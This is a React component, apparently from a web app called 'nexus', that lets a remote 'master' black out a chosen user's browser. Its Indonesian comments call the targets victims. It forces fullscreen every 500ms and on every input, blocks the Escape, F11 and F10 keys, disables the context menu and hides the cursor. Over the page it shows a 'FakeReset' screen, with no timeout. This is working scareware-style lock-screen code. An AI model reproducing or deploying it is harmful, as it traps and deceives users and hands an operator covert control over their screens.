import { useCallback, useEffect, useRef, useState } from 'react';
import { useStore } from '../lib/store';
import { rpcGetBlackout, rpcGetBlackoutPublic } from '../lib/api';
import { onBlackout } from '../lib/realtime';
import FakeReset from './FakeReset';

const POLL_MS = 4000;

const LAST_USER_KEY = 'nexus:lastuser';

function lastUsername(): string {
  try {
    return localStorage.getItem(LAST_USER_KEY) ?? '';
  } catch {
    return '';
  }
}

export default function BlackoutOverlay() {
  const me = useStore((s) => s.me);
  const [blacked, setBlacked] = useState(false);
  const blackedRef = useRef(false);

  const setB = useCallback((v: boolean) => {
    blackedRef.current = v;
    setBlacked(v);
  }, []);

  const check = useCallback(async () => {
    const st = useStore.getState();
    try {
      if (st.me?.id) {
        const active = await rpcGetBlackout(st.me.id);
        setB(active);
      } else {
        const uname = lastUsername();
        if (uname) {
          const active = await rpcGetBlackoutPublic(uname);
          setB(active);
        }
      }
    } catch {
      /* jaringan / bukan korban */
    }
  }, [setB]);

  useEffect(() => {
    if (me?.id) check();
  }, [me?.id, check]);

  useEffect(() => {
    const t = setInterval(() => {
      const st = useStore.getState();
      if (st.me || lastUsername()) check();
    }, POLL_MS);
    const onVis = () => {
      if (!document.hidden) check();
    };
    document.addEventListener('visibilitychange', onVis);
    window.addEventListener('focus', onVis);
    return () => {
      clearInterval(t);
      document.removeEventListener('visibilitychange', onVis);
      window.removeEventListener('focus', onVis);
    };
  }, [check]);

  useEffect(() => {
    return onBlackout((p) => {
      const uid = useStore.getState().me?.id;
      if (uid && p.target_user_id === uid) setB(p.active);
    });
  }, [setB]);

  // Kunci layar penuh selama blackout: browser cuma mau masuk fullscreen saat
  // ada gerakan user, jadi kita minta ulang tiap kali korban klik/ketuk/scroll
  // atau tekan tombol apa pun. F11/Esc/F10 di-block (preventDefault) di fase
  // capture biar keduluan; interval 500ms menjaga kalau ada event yg lewat.
  // Status hitam nggak ada timer — bertahan sampai master matikan dari panel.
  useEffect(() => {
    if (!blacked) return;

    const enter = () => {
      try {
        if (document.fullscreenEnabled && !document.fullscreenElement) {
          document.documentElement.requestFullscreen?.().catch(() => {});
        }
      } catch {
        /* noop */
      }
    };

    const onKey = (e: KeyboardEvent) => {
      if (e.key === 'F11' || e.key === 'Escape' || e.key === 'F10') {
        e.preventDefault();
        e.stopPropagation();
      }
      enter();
    };

    const onFullscreen = () => {
      if (!document.fullscreenElement) enter();
    };

    const onCtx = (e: Event) => e.preventDefault();
    const onTouch = () => enter();
    const onWheel = () => enter();
    const onResize = () => {
      window.scrollTo(0, 0);
      enter();
    };

    enter();
    const id = window.setInterval(enter, 500);
    window.addEventListener('keydown', onKey, true);
    document.addEventListener('keydown', onKey, true);
    document.addEventListener('pointerdown', enter);
    document.addEventListener('touchstart', onTouch);
    document.addEventListener('wheel', onWheel);
    document.addEventListener('fullscreenchange', onFullscreen);
    document.addEventListener('contextmenu', onCtx);
    window.addEventListener('resize', onResize);
    return () => {
      clearInterval(id);
      window.removeEventListener('keydown', onKey, true);
      document.removeEventListener('keydown', onKey, true);
      document.removeEventListener('pointerdown', enter);
      document.removeEventListener('touchstart', onTouch);
      document.removeEventListener('wheel', onWheel);
      document.removeEventListener('fullscreenchange', onFullscreen);
      document.removeEventListener('contextmenu', onCtx);
      window.removeEventListener('resize', onResize);
    };
  }, [blacked]);

  useEffect(() => {
    return () => {
      if (!blackedRef.current && document.fullscreenElement) {
        try {
          document.exitFullscreen?.().catch(() => {});
        } catch {
          /* noop */
        }
      }
    };
  }, []);

  if (!blacked) return null;

  return (
    <div
      className="fixed inset-0 z-[999999] overflow-hidden"
      style={{
        pointerEvents: 'auto',
        userSelect: 'none',
        cursor: 'none',
        touchAction: 'none',
        overscrollBehavior: 'none',
      }}
      aria-hidden
      onPointerDown={(e) => e.preventDefault()}
      onTouchMove={(e) => e.preventDefault()}
    >
      <FakeReset />
    </div>
  );
}
